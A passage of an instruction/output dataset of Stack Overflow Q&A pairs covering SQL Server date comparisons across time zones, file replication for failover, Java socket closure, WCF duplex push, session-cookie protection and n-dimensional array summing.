@activityDateMidnight\n\n[Edit]\nI'm incorporating @Todd's suggestion:\nwhere datediff(day, dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), @ActivityDate) = 0\n\nMy misconception about how datediff works (the same day of year in consecutive years yields 366, not 0 as I expected) caused me to waste a lot of effort.\nBut the query plan didn't change.  I think I need to go back to the drawing board with the whole thing.", "output": "You pretty much have to keep the left side of your where clause clean. So, normally, you'd do something like:\nWHERE MyDateTime >= @activityDateMidnight \n      AND MyDateTime < (@activityDateMidnight + 1)\n\n(Some folks prefer DATEADD(d, 1, @activityDateMidnight) instead - but it's the same thing).\nThe TimeZone table complicates matter a bit though. It's a little unclear from your snippet, but it looks like t.TheDateInTable is in GMT with a Time Zone identifier, and that you're then adding the offset to compare against @activityDateMidnight - which is in local time. I'm not sure what ds.LocalTimeZone is, though.\nIf that's the case, then you need to get @activityDateMidnight into GMT instead."}
{"instruction": "We have a situation where users are allowed to upload content, and then separately make some changes, then submit a form based on those changes.\nThis works fine in a single-server, non-failover environment, however we would like some sort of solution for sharing the files between servers that supports failover.\nHas anyone run into this in the past?  And what kind of solutions were you able to develop?  Obviously persisting to the database is one option, but we'd prefer to avoid that.", "output": "A shared SAN with failover is a great solution with a great (high) cost.  Are there any similar solutions with failover at a reasonable cost?  Perhaps something like DRBD for windows?\nThe problem with a simple shared filesystem is the lack of redundancy (what if the fileserver goes down)?"}
{"instruction": "We have a situation where users are allowed to upload content, and then separately make some changes, then submit a form based on those changes.\nThis works fine in a single-server, non-failover environment, however we would like some sort of solution for sharing the files between servers that supports failover.\nHas anyone run into this in the past?  And what kind of solutions were you able to develop?  Obviously persisting to the database is one option, but we'd prefer to avoid that.", "output": "At a former job we had a cluster of web servers with an F5 load balancer in front of them.  We had a very similar problem in that our applications allowed users to upload content which might include photo's and such.  These were legacy applications and we did not want to edit them to use a database and a SAN solution was too expensive for our situation.\nWe ended up using a file replication service on the two clustered servers. This ran as a service on both machines using an account that had network access to paths on the opposite server.  When a file was uploaded, this backend service sync'd the data in the file system folders making it available to be served from either web server.\nTwo of the products we reviewed were ViceVersa and PeerSync.  I think we ended up using PeerSync."}
{"instruction": "Here is the issue I am having: I have a large query that needs to compare datetimes in the where clause to see if two dates are on the same day.  My current solution, which sucks, is to send the datetimes into a UDF to convert them to midnight of the same day, and then check those dates for equality.  When it comes to the query plan, this is a disaster, as are almost all UDFs in joins or where clauses.  This is one of the only places in my application that I haven't been able to root out the functions and give the query optimizer something it can actually use to locate the best index.\nIn this case, merging the function code back into the query seems impractical.\nI think I am missing something simple here.\nHere's the function for reference.\nif not exists (select * from dbo.sysobjects \n              where id = object_id(N'dbo.f_MakeDate') and               \n              type in (N'FN', N'IF', N'TF', N'FS', N'FT'))\n  exec('create function dbo.f_MakeDate() returns int as \n         begin declare @retval int return @retval end')\ngo\n\nalter function dbo.f_MakeDate\n(\n    @Day datetime, \n    @Hour int, \n    @Minute int\n)\nreturns datetime\nas\n\n/*\n\nCreates a datetime using the year-month-day portion of @Day, and the \n@Hour and @Minute provided\n\n*/\n\nbegin\n\ndeclare @retval datetime\nset @retval = cast(\n    cast(datepart(m, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(d, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(yyyy, @Day) as varchar(4)) + \n    ' ' + \n    cast(@Hour as varchar(2)) + \n    ':' + \n    cast(@Minute as varchar(2)) as datetime)\nreturn @retval\nend\n\ngo\n\nTo complicate matters, I am joining on time zone tables to check the date against the local time, which could be different for every row:\nwhere \ndbo.f_MakeDate(dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), 0, 0) = @activityDateMidnight\n\n[Edit]\nI'm incorporating @Todd's suggestion:\nwhere datediff(day, dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), @ActivityDate) = 0\n\nMy misconception about how datediff works (the same day of year in consecutive years yields 366, not 0 as I expected) caused me to waste a lot of effort.\nBut the query plan didn't change.  I think I need to go back to the drawing board with the whole thing.", "output": "Make sure to read Only In A Database Can You Get 1000% + Improvement By Changing A Few Lines Of Code so that you are sure that the optimizer can utilize the index effectively when messing with dates"}
{"instruction": "Here is the issue I am having: I have a large query that needs to compare datetimes in the where clause to see if two dates are on the same day.  My current solution, which sucks, is to send the datetimes into a UDF to convert them to midnight of the same day, and then check those dates for equality.  When it comes to the query plan, this is a disaster, as are almost all UDFs in joins or where clauses.  This is one of the only places in my application that I haven't been able to root out the functions and give the query optimizer something it can actually use to locate the best index.\nIn this case, merging the function code back into the query seems impractical.\nI think I am missing something simple here.\nHere's the function for reference.\nif not exists (select * from dbo.sysobjects \n              where id = object_id(N'dbo.f_MakeDate') and               \n              type in (N'FN', N'IF', N'TF', N'FS', N'FT'))\n  exec('create function dbo.f_MakeDate() returns int as \n         begin declare @retval int return @retval end')\ngo\n\nalter function dbo.f_MakeDate\n(\n    @Day datetime, \n    @Hour int, \n    @Minute int\n)\nreturns datetime\nas\n\n/*\n\nCreates a datetime using the year-month-day portion of @Day, and the \n@Hour and @Minute provided\n\n*/\n\nbegin\n\ndeclare @retval datetime\nset @retval = cast(\n    cast(datepart(m, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(d, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(yyyy, @Day) as varchar(4)) + \n    ' ' + \n    cast(@Hour as varchar(2)) + \n    ':' + \n    cast(@Minute as varchar(2)) as datetime)\nreturn @retval\nend\n\ngo\n\nTo complicate matters, I am joining on time zone tables to check the date against the local time, which could be different for every row:\nwhere \ndbo.f_MakeDate(dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), 0, 0) = @activityDateMidnight\n\n[Edit]\nI'm incorporating @Todd's suggestion:\nwhere datediff(day, dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), @ActivityDate) = 0\n\nMy misconception about how datediff works (the same day of year in consecutive years yields 366, not 0 as I expected) caused me to waste a lot of effort.\nBut the query plan didn't change.  I think I need to go back to the drawing board with the whole thing.", "output": "You're spoilt for choice in terms of options here. If you are using Sybase or SQL Server 2008 you can create variables of type date and assign them your datetime values. The database engine gets rid of the time for you. Here's a quick and dirty test to illustrate (Code is in Sybase dialect):\ndeclare @date1 date\ndeclare @date2 date\nset @date1='2008-1-1 10:00'\nset @date2='2008-1-1 22:00'\nif @date1=@date2\n    print 'Equal'\nelse\n    print 'Not equal'\n\nFor SQL 2005 and earlier what you can do is convert the date to a varchar in a format that does not have the time component. For instance the following returns 2008.08.22\nselect convert(varchar,'2008-08-22 18:11:14.133',102)\n\nThe 102 part specifies the formatting (Books online can list for you all the available formats)\nSo, what you can do is write a function that takes a datetime and extracts the date element and discards the time. Like so:\ncreate function MakeDate (@InputDate datetime) returns datetime as\nbegin\n    return cast(convert(varchar,@InputDate,102) as datetime);\nend\n\nYou can then use the function for companions\nSelect * from Orders where dbo.MakeDate(OrderDate) = dbo.MakeDate(DeliveryDate)"}
{"instruction": "Here is the issue I am having: I have a large query that needs to compare datetimes in the where clause to see if two dates are on the same day.  My current solution, which sucks, is to send the datetimes into a UDF to convert them to midnight of the same day, and then check those dates for equality.  When it comes to the query plan, this is a disaster, as are almost all UDFs in joins or where clauses.  This is one of the only places in my application that I haven't been able to root out the functions and give the query optimizer something it can actually use to locate the best index.\nIn this case, merging the function code back into the query seems impractical.\nI think I am missing something simple here.\nHere's the function for reference.\nif not exists (select * from dbo.sysobjects \n              where id = object_id(N'dbo.f_MakeDate') and               \n              type in (N'FN', N'IF', N'TF', N'FS', N'FT'))\n  exec('create function dbo.f_MakeDate() returns int as \n         begin declare @retval int return @retval end')\ngo\n\nalter function dbo.f_MakeDate\n(\n    @Day datetime, \n    @Hour int, \n    @Minute int\n)\nreturns datetime\nas\n\n/*\n\nCreates a datetime using the year-month-day portion of @Day, and the \n@Hour and @Minute provided\n\n*/\n\nbegin\n\ndeclare @retval datetime\nset @retval = cast(\n    cast(datepart(m, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(d, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(yyyy, @Day) as varchar(4)) + \n    ' ' + \n    cast(@Hour as varchar(2)) + \n    ':' + \n    cast(@Minute as varchar(2)) as datetime)\nreturn @retval\nend\n\ngo\n\nTo complicate matters, I am joining on time zone tables to check the date against the local time, which could be different for every row:\nwhere \ndbo.f_MakeDate(dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), 0, 0) = @activityDateMidnight\n\n[Edit]\nI'm incorporating @Todd's suggestion:\nwhere datediff(day, dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), @ActivityDate) = 0\n\nMy misconception about how datediff works (the same day of year in consecutive years yields 366, not 0 as I expected) caused me to waste a lot of effort.\nBut the query plan didn't change.  I think I need to go back to the drawing board with the whole thing.", "output": "I would use the dayofyear function of datepart:\n\nSelect *\nfrom mytable\nwhere datepart(dy,date1) = datepart(dy,date2)\nand\nyear(date1) = year(date2) --assuming you want the same year too\n\nSee the datepart reference here."}
{"instruction": "Here is the issue I am having: I have a large query that needs to compare datetimes in the where clause to see if two dates are on the same day.  My current solution, which sucks, is to send the datetimes into a UDF to convert them to midnight of the same day, and then check those dates for equality.  When it comes to the query plan, this is a disaster, as are almost all UDFs in joins or where clauses.  This is one of the only places in my application that I haven't been able to root out the functions and give the query optimizer something it can actually use to locate the best index.\nIn this case, merging the function code back into the query seems impractical.\nI think I am missing something simple here.\nHere's the function for reference.\nif not exists (select * from dbo.sysobjects \n              where id = object_id(N'dbo.f_MakeDate') and               \n              type in (N'FN', N'IF', N'TF', N'FS', N'FT'))\n  exec('create function dbo.f_MakeDate() returns int as \n         begin declare @retval int return @retval end')\ngo\n\nalter function dbo.f_MakeDate\n(\n    @Day datetime, \n    @Hour int, \n    @Minute int\n)\nreturns datetime\nas\n\n/*\n\nCreates a datetime using the year-month-day portion of @Day, and the \n@Hour and @Minute provided\n\n*/\n\nbegin\n\ndeclare @retval datetime\nset @retval = cast(\n    cast(datepart(m, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(d, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(yyyy, @Day) as varchar(4)) + \n    ' ' + \n    cast(@Hour as varchar(2)) + \n    ':' + \n    cast(@Minute as varchar(2)) as datetime)\nreturn @retval\nend\n\ngo\n\nTo complicate matters, I am joining on time zone tables to check the date against the local time, which could be different for every row:\nwhere \ndbo.f_MakeDate(dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), 0, 0) = @activityDateMidnight\n\n[Edit]\nI'm incorporating @Todd's suggestion:\nwhere datediff(day, dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), @ActivityDate) = 0\n\nMy misconception about how datediff works (the same day of year in consecutive years yields 366, not 0 as I expected) caused me to waste a lot of effort.\nBut the query plan didn't change.  I think I need to go back to the drawing board with the whole thing.", "output": "Regarding timezones, yet one more reason to store all dates in a single timezone (preferably UTC). Anyway, I think the answers using datediff, datepart and the different built-in date functions are your best bet."}
{"instruction": "Here is the issue I am having: I have a large query that needs to compare datetimes in the where clause to see if two dates are on the same day.  My current solution, which sucks, is to send the datetimes into a UDF to convert them to midnight of the same day, and then check those dates for equality.  When it comes to the query plan, this is a disaster, as are almost all UDFs in joins or where clauses.  This is one of the only places in my application that I haven't been able to root out the functions and give the query optimizer something it can actually use to locate the best index.\nIn this case, merging the function code back into the query seems impractical.\nI think I am missing something simple here.\nHere's the function for reference.\nif not exists (select * from dbo.sysobjects \n              where id = object_id(N'dbo.f_MakeDate') and               \n              type in (N'FN', N'IF', N'TF', N'FS', N'FT'))\n  exec('create function dbo.f_MakeDate() returns int as \n         begin declare @retval int return @retval end')\ngo\n\nalter function dbo.f_MakeDate\n(\n    @Day datetime, \n    @Hour int, \n    @Minute int\n)\nreturns datetime\nas\n\n/*\n\nCreates a datetime using the year-month-day portion of @Day, and the \n@Hour and @Minute provided\n\n*/\n\nbegin\n\ndeclare @retval datetime\nset @retval = cast(\n    cast(datepart(m, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(d, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(yyyy, @Day) as varchar(4)) + \n    ' ' + \n    cast(@Hour as varchar(2)) + \n    ':' + \n    cast(@Minute as varchar(2)) as datetime)\nreturn @retval\nend\n\ngo\n\nTo complicate matters, I am joining on time zone tables to check the date against the local time, which could be different for every row:\nwhere \ndbo.f_MakeDate(dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), 0, 0) = @activityDateMidnight\n\n[Edit]\nI'm incorporating @Todd's suggestion:\nwhere datediff(day, dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), @ActivityDate) = 0\n\nMy misconception about how datediff works (the same day of year in consecutive years yields 366, not 0 as I expected) caused me to waste a lot of effort.\nBut the query plan didn't change.  I think I need to go back to the drawing board with the whole thing.", "output": "Eric Z Beard:\n\nI do store all dates in GMT. Here's the use case: something happened at 11:00 PM EST on the 1st, which is the 2nd GMT. I want to see activity for the 1st, and I am in EST so I will want to see the 11PM activity. If I just compared raw GMT datetimes, I would miss things. Each row in the report can represent an activity from a different time zone.\n\nRight, but when you say you're interested in activity for Jan 1st 2008 EST:\nSELECT @activityDateMidnight = '1/1/2008', @activityDateTZ = 'EST'\n\nyou just need to convert that to GMT (I'm ignoring the complication of querying for the day before EST goes to EDT, or vice versa):\nTable: TimeZone\nFields: TimeZone, Offset\nValues: EST, -4\n\n--Multiply by -1, since we're converting EST to GMT.\n--Offsets are to go from GMT to EST.\nSELECT @activityGmtBegin = DATEADD(hh, Offset * -1, @activityDateMidnight)\nFROM TimeZone\nWHERE TimeZone = @activityDateTZ\n\nwhich should give you '1/1/2008 4:00 AM'. Then, you can just search in GMT:\nSELECT * FROM EventTable\nWHERE \n   EventTime >= @activityGmtBegin --1/1/2008 4:00 AM\n   AND EventTime < (@activityGmtBegin + 1) --1/2/2008 4:00 AM\n\nThe event in question is stored with a GMT EventTime of 1/2/2008 3:00 AM. You don't even need the TimeZone in the EventTable (for this purpose, at least). \nSince EventTime is not in a function, this is a straight index scan - which should be pretty efficient. Make EventTime your clustered index, and it'll fly. ;)\nPersonally, I'd have the app convert the search time into GMT before running the query."}
{"instruction": "I have a listening port on my server that I'm connecting to using a Java class and the Socket interface, i.e.\nSocket mySocket = new Socket(host,port);\n\nI then grab an OutputStream, decorate with a PrintWriter in autoflush mode and I'm laughing - except if the listening port closes. Then I get \ntcp4       0      0  *.9999                 *.*                    LISTEN\ntcp        0      0  127.0.0.1.45737        127.0.0.1.9999         CLOSE_WAIT\n\nand I can't seem to detect the problem in the program - I've tried using the isConnected() method on the socket but it doesn't seem to know that the connection is closed.\nI want to be aware of the problem the next time I try and write to the Socket so that I can try and reconnect and report the issue.\nAny advice please?\nThanks all", "output": "Set a short timeout?\nDoes isOutputShutdown() not get you what you want?\nYou could always build a SocketWatcher class that spins up in its own Thread and repeatedly tries to write empty strings to the Socket until that raises a SocketClosedException."}
{"instruction": "Here is the issue I am having: I have a large query that needs to compare datetimes in the where clause to see if two dates are on the same day.  My current solution, which sucks, is to send the datetimes into a UDF to convert them to midnight of the same day, and then check those dates for equality.  When it comes to the query plan, this is a disaster, as are almost all UDFs in joins or where clauses.  This is one of the only places in my application that I haven't been able to root out the functions and give the query optimizer something it can actually use to locate the best index.\nIn this case, merging the function code back into the query seems impractical.\nI think I am missing something simple here.\nHere's the function for reference.\nif not exists (select * from dbo.sysobjects \n              where id = object_id(N'dbo.f_MakeDate') and               \n              type in (N'FN', N'IF', N'TF', N'FS', N'FT'))\n  exec('create function dbo.f_MakeDate() returns int as \n         begin declare @retval int return @retval end')\ngo\n\nalter function dbo.f_MakeDate\n(\n    @Day datetime, \n    @Hour int, \n    @Minute int\n)\nreturns datetime\nas\n\n/*\n\nCreates a datetime using the year-month-day portion of @Day, and the \n@Hour and @Minute provided\n\n*/\n\nbegin\n\ndeclare @retval datetime\nset @retval = cast(\n    cast(datepart(m, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(d, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(yyyy, @Day) as varchar(4)) + \n    ' ' + \n    cast(@Hour as varchar(2)) + \n    ':' + \n    cast(@Minute as varchar(2)) as datetime)\nreturn @retval\nend\n\ngo\n\nTo complicate matters, I am joining on time zone tables to check the date against the local time, which could be different for every row:\nwhere \ndbo.f_MakeDate(dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), 0, 0) = @activityDateMidnight\n\n[Edit]\nI'm incorporating @Todd's suggestion:\nwhere datediff(day, dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), @ActivityDate) = 0\n\nMy misconception about how datediff works (the same day of year in consecutive years yields 366, not 0 as I expected) caused me to waste a lot of effort.\nBut the query plan didn't change.  I think I need to go back to the drawing board with the whole thing.", "output": "@Eric: No you won't miss anything. If you want to see what happened at 11pm EST, you look for things that happened at the corresponding time in GMT. If all the records are converted into GMT before saving, it shouldn't matter. So long as you convert the requested time (i.e. 11pm) to GMT before using it in the query."}
{"instruction": "See also How does a WCF server inform\n  a WCF client about changes? (Better\n  solution then simple polling, e.g.\n  Coment or long polling)\n\nI need to use push-technology with WCF through client firewalls. This must be a common problem, and I know for a fact it works in theory (see links below), but I have failed to get it working, and I haven't been able to find a code sample that demonstrates it.\nRequirements: \n\nWCF\nClients connects to server through tcp port 80 (netTcpBinding).\nServer pushes back information at irregular intervals (1 min to several hours).\nUsers should not have to configure their firewalls, server pushes must pass through firewalls that have all inbound ports closed. TCP duplex on the same connection is needed for this, a dual binding does not work since a port has to be opened on the client firewall.\nClients sends heartbeats to server at regular intervals (perhaps every 15 mins) so server knows client is still alive.\nServer is IIS7 with WAS.\n\nThe solution seems to be duplex netTcpBinding. Based on this information:\nWCF through firewalls and NATs\nKeeping connections open in IIS\nBut I have yet to find a code sample that works.. I've tried combining the \"Duplex\" and \"TcpActivation\" samples from Microsoft's WCF Samples without any luck. Please can someone point me to example code that works, or build a small sample app. Thanks a lot!", "output": "In most firewall setups, the TCP connection will be torn down by the firewall if it is idle to conserve resources. The idle timeout is probably not something you can control. Some will tear them down if they are idle and a resource limit is being hit.\nMost corp environments won't allow any machines to make an outbound TCP connection anyway.\nAlso, using this mechanism means you are going to have scaling problems. I think more reliable solution is to queue up information and have your clients poll for them regularly. Utilize caching if possible such that a subsequent client poll will get the cached data from the customers proxy cache, if they are using one.\nIf you have to push data in a timely manner, in sub-second land (i.e. financial services), then consider some messaging infrastructure such an NServiceBus distributor on client side, but that will require a customer install...\nSo have you tried using Toredo? Having read that it would appear there it is prob too complicated for a user to setup."}
{"instruction": "Specifically this is regarding when using a client session cookie to identify a session on the server.\nIs the best answer to use SSL/HTTPS encryption for the entire web site, and you have the best guarantee that no man in the middle attacks will be able to sniff an existing client session cookie?\nAnd perhaps second best to use some sort of encryption on the session value itself that is stored in your session cookie?\nIf a malicious user has physical access to a machine, they can still look at the filesystem to retrieve a valid session cookie and use that to hijack a session?", "output": "To reduce the risk you can also associate the originating IP with the session. That way an attacker has to be within the same private network to be able to use the session.\nChecking referer headers can also be an option but those are more easily spoofed."}
{"instruction": "Specifically this is regarding when using a client session cookie to identify a session on the server.\nIs the best answer to use SSL/HTTPS encryption for the entire web site, and you have the best guarantee that no man in the middle attacks will be able to sniff an existing client session cookie?\nAnd perhaps second best to use some sort of encryption on the session value itself that is stored in your session cookie?\nIf a malicious user has physical access to a machine, they can still look at the filesystem to retrieve a valid session cookie and use that to hijack a session?", "output": "Encrypting the session value will have zero effect. The session cookie is already an arbitrary value, encrypting it will just generate another arbitrary value that can be sniffed.\nThe only real solution is HTTPS. If you don't want to do SSL on your whole site (maybe you have performance concerns), you might be able to get away with only SSL protecting the sensitive areas. To do that, first make sure your login page is HTTPS. When a user logs in, set a secure cookie (meaning the browser will only transmit it over an SSL link) in addition to the regular session cookie. Then, when a user visits one of your \"sensitive\" areas, redirect them to HTTPS, and check for the presence of that secure cookie. A real user will have it, a session hijacker will not.\nEDIT: This answer was originally written in 2008. It's 2016 now, and there's no reason not to have SSL across your entire site. No more plaintext HTTP!"}
{"instruction": "I'm using Intridea's Acts as Readable Rails plugin for a messaging system I'm currently building.\nI've defined my message class accordingly:\nclass Post < ActiveRecord::Base\n  acts-as-readable\nend\n\nAnd everything seems to be working according to plan, but when trying to execute to show unread messages in my message view, I'm running into problems.\nTheir example: (I've changed underscores to hyphens due to formatting issues)\nbob = User.find_by_name(\"bob\")\n\nbob.readings                      # => []\n\nPost.find_unread_by(bob)          # => [<Post 1>,<Post 2>,<Post 3>...]\nPost.find_read_by(bob)            # => []\n\nPost.find(1).read_by?(bob)        # => false\nPost.find(1).read_by!(bob)        # => <Reading 1>\nPost.find(1).read_by?(bob)        # => true\nPost.find(1).users_who_read       # => [<User bob>]\n\nPost.find_unread_by(bob)          # => [<Post 2>,<Post 3>...]\nPost.find_read_by(bob)            # => [<Post 1>]\n\nbob.readings                      # => [<Reading 1>]\n\nSo it seems as though if I wanted to list the number of unread messages sitting in a mailbox (for example Inbox (39) ), I should be able to do something like:\n<%= Post.find_unread_by(current-user).count %>\n\nBut to no avail.  I always seem to get stuck on the simple view issues after everything's set.\nAny ideas?", "output": "The following will work\n<%= Post.find_unread_by(current_user).size %>\n\nor\n<%= Post.find_unread_by(current_user).length %>\n\nHowever if you check your development.log you should see that it gets the unread count by \n\nRetrieving all the posts\nRetrieving all the posts read by the user\nRemoving all of 2. from 1. in ruby\n\nThis will be very bad performance wise with lots of posts. \nA better way would be to retrieve the posts read by the current user and then use ActiveRecord::Calculations to get a count without retrieving all the posts in the database\nPost.count(:conditions => [ \"id NOT IN (?)\", Post.find_read_by(current_user)])\n\nThis should go into your Post model to follow best practices of not having finders in the view  or controller \nPost.rb\ndef self.unread_post_count_for_user(user)\n  count(:conditions => [ \"id NOT IN (?)\", Post.find_read_by(user)])\nend\n\nThen your view will just be\n<%= Post.unread_post_count_for_user(current-user) %>"}
{"instruction": "I am working on a function to establish the entropy of a distribution.  It uses a copula, if any are familiar with that.  I need to sum up the values in the array based on which dimensions are \"cared about.\"\nExample:  Consider the following example... \n\nDimension 0 (across)\n_ _ _ _ _ _ _ _ _ _ _ _ _\n|_ 0 _|_ 0 _|_ 0 _|_ 2 _|  Dimension 1\n|_ 1 _|_ 0 _|_ 2 _|_ 0 _|   (down)\n|_ 0 _|_ 3 _|_ 0 _|_ 6 _|\n|_ 0 _|_ 0 _|_ 0 _|_ 0 _|\n\nI \"care about\" dimension 0 only, and \"don't care\" about the rest (dim 1).\nSumming this array with the above specifications will\n\"collapse\" the \"stacks\" of dimension 1 down to a single 4 x 1 array:\n\n_ _ _ _ _ _ _ _ _ _ _ _ _ \n|_ 1 _|_ 3 _|_ 2 _|_ 8 _|\n\nThis can then be summed, or have any operation performed.\n\nI need to do this with an array of 'n' dimensions, which could feasibly be 20. Also, I need to be able to do this, caring about certain dimensions, and collapsing the rest.  I am having an especially hard time with this because I cant visualize 20 dimensions :p . If anyone could help me set up some c/c++ code to collapse/sum, I would be very very grateful.  \nUpdate:\nJust got home.  Here is some info to answer your questions:\n\nSorry for rolling back the edits, I was hoping when I clicked roll-back it would show me the changes so I could see what I messed up, a bit like wikipedia.  This wasn't the case, as I found out.\n@jeff - What doesnt make sense?  I am using this great service for (what I think is) a legit reason.  I want to get better at my hobby, which is all it is, as I am in high school.  Many of my posts regard implementing a genetic algorithm (This post, sparsearray, rank an array, pointer manipulation).\nI am using a sparse array representation, as it is possible to exceed the number of molecules in the universe using a traditional (dense) array.  For now, the implementation of the sparsearray itself doesnt matter a whole lot, as I am working to make it work with a standard array before going to a sparse representation.  For those who havent seen my previous questions, I am using a binary search tree as the structure to contain the sparse array points, and a \"driver\" function to traverse the tree as necessary, returning whatever the function is designed to do.  This is flexible, so I can accomodate a lot of different methods of accessing the array. \nThe structure is a hypercube, and the number of dimensions is specified at run time, as well as the length of each dimension (which are all the same, as it is a hypercube).\n\nThanks everyone for your imput.", "output": "Actually, by colllapsing the colums you already summed them, so the dimension doesn't matter at all for your example. Did I miss something or did you?"}
{"instruction": "I am working on a function to establish the entropy of a distribution.  It uses a copula, if any are familiar with that.  I need to sum up the values in the array based on which dimensions are \"cared about.\"\nExample:  Consider the following example... \n\nDimension 0 (across)\n_ _ _ _ _ _ _ _ _ _ _ _ _\n|_ 0 _|_ 0 _|_ 0 _|_ 2 _|  Dimension 1\n|_ 1 _|_ 0 _|_ 2 _|_ 0 _|   (down)\n|_ 0 _|_ 3 _|_ 0 _|_ 6 _|\n|_ 0 _|_ 0 _|_ 0 _|_ 0 _|\n\nI \"care about\" dimension 0 only, and \"don't care\" about the rest (dim 1).\nSumming this array with the above specifications will\n\"collapse\" the \"stacks\" of dimension 1 down to a single 4 x 1 array:\n\n_ _ _ _ _ _ _ _ _ _ _ _ _ \n|_ 1 _|_ 3 _|_ 2 _|_ 8 _|\n\nThis can then be summed, or have any operation performed.\n\nI need to do this with an array of 'n' dimensions, which could feasibly be 20. Also, I need to be able to do this, caring about certain dimensions, and collapsing the rest.  I am having an especially hard time with this because I cant visualize 20 dimensions :p . If anyone could help me set up some c/c++ code to collapse/sum, I would be very very grateful.  \nUpdate:\nJust got home.  Here is some info to answer your questions:\n\nSorry for rolling back the edits, I was hoping when I clicked roll-back it would show me the changes so I could see what I messed up, a bit like wikipedia.  This wasn't the case, as I found out.\n@jeff - What doesnt make sense?  I am using this great service for (what I think is) a legit reason.  I want to get better at my hobby, which is all it is, as I am in high school.  Many of my posts regard implementing a genetic algorithm (This post, sparsearray, rank an array, pointer manipulation).\nI am using a sparse array representation, as it is possible to exceed the number of molecules in the universe using a traditional (dense) array.  For now, the implementation of the sparsearray itself doesnt matter a whole lot, as I am working to make it work with a standard array before going to a sparse representation.  For those who havent seen my previous questions, I am using a binary search tree as the structure to contain the sparse array points, and a \"driver\" function to traverse the tree as necessary, returning whatever the function is designed to do.  This is flexible, so I can accomodate a lot of different methods of accessing the array. \nThe structure is a hypercube, and the number of dimensions is specified at run time, as well as the length of each dimension (which are all the same, as it is a hypercube).\n\nThanks everyone for your imput.", "output": "I think the best thing to do here would be one/both of two things:\n\nRethink the design, if its too complex, find a less-complex way.\nStop trying to visualise it.. :P Just store the dimensions in question that you need to sum, then do them one at a time. Once you have the base code, then look at improving the efficiency of your algorithm."}
{"instruction": "I am working on a function to establish the entropy of a distribution.  It uses a copula, if any are familiar with that.  I need to sum up the values in the array based on which dimensions are \"cared about.\"\nExample:  Consider the following example... \n\nDimension 0 (across)\n_ _ _ _ _ _ _ _ _ _ _ _ _\n|_ 0 _|_ 0 _|_ 0 _|_ 2 _|  Dimension 1\n|_ 1 _|_ 0 _|_ 2 _|_ 0 _|   (down)\n|_ 0 _|_ 3 _|_ 0 _|_ 6 _|\n|_ 0 _|_ 0 _|_ 0 _|_ 0 _|\n\nI \"care about\" dimension 0 only, and \"don't care\" about the rest (dim 1).\nSumming this array with the above specifications will\n\"collapse\" the \"stacks\" of dimension 1 down to a single 4 x 1 array:\n\n_ _ _ _ _ _ _ _ _ _ _ _ _ \n|_ 1 _|_ 3 _|_ 2 _|_ 8 _|\n\nThis can then be summed, or have any operation performed.\n\nI need to do this with an array of 'n' dimensions, which could feasibly be 20. Also, I need to be able to do this, caring about certain dimensions, and collapsing the rest.  I am having an especially hard time with this because I cant visualize 20 dimensions :p . If anyone could help me set up some c/c++ code to collapse/sum, I would be very very grateful.  \nUpdate:\nJust got home.  Here is some info to answer your questions:\n\nSorry for rolling back the edits, I was hoping when I clicked roll-back it would show me the changes so I could see what I messed up, a bit like wikipedia.  This wasn't the case, as I found out.\n@jeff - What doesnt make sense?  I am using this great service for (what I think is) a legit reason.  I want to get better at my hobby, which is all it is, as I am in high school.  Many of my posts regard implementing a genetic algorithm (This post, sparsearray, rank an array, pointer manipulation).\nI am using a sparse array representation, as it is possible to exceed the number of molecules in the universe using a traditional (dense) array.  For now, the implementation of the sparsearray itself doesnt matter a whole lot, as I am working to make it work with a standard array before going to a sparse representation.  For those who havent seen my previous questions, I am using a binary search tree as the structure to contain the sparse array points, and a \"driver\" function to traverse the tree as necessary, returning whatever the function is designed to do.  This is flexible, so I can accomodate a lot of different methods of accessing the array. \nThe structure is a hypercube, and the number of dimensions is specified at run time, as well as the length of each dimension (which are all the same, as it is a hypercube).\n\nThanks everyone for your imput.", "output": "I beg to differ, there is ALWAYS another way..\nAnd if you really cannot refactor, then you need to break the problem down into smaller parts.. Like I said, establish which dimensions you need to sum, then hit them one at a time..\nAlso, stop changing the edits, they are correcting your spelling errors, they are trying to help you ;)"}
